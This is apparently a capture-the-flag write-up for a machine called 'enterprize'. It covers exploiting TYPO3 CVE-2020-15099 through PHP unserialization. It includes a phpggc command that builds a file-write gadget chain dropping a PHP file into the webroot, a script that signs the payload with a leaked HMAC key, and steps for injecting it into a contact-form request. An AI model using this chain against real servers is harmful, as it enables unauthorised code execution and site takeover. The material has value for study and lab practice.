# enterprize
TYPO3:  CVE-2020-15099

An un-serialization exploit where our provided serialized final payload can be used to write files on the server or inject RCE. There needs to be a HMAC hash appended to the payload which is checked by the server, it can be generated with our partial serialized payload and an “encryption key” found from old config files.

We need to generate a gadget chain for file write and we can use `phpgcc` for that, one snag here is that the php version(example 7.2) used to generate the payload should match the one used by the server. This can be found from trial and error or other leaks from the webserver(info functions/erros/disclosures) etc.,

We can use a docker container to match the php version like

```text-plain
docker run -it -v "$PWD":/usr/src/myapp -w /usr/src/myapp php:7.2-cli phpggc/phpggc -b -f Guzzle/FW1 /var/wwww/html/public/fileadmin/_temp_/payload.php payload.php 
```

(-b is for base64 encoding, -f is fast destruct, the payload used, the remote file path where to write the payload file and the local path for our payload)

This will generate a seriazlized payload but we need a hmac hash(using sha1 which can be found by reading the github code files of the CMS) at the end of it that is generated with the leaked encryption key.

```text-plain
<?php
$sig=hash_hmac('sha1',$argv[1],"712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b");
print($sig);
?>
```

Now, we need to intercept a post form request and replace our final payload(serialized+hmac hash) with the contact form data.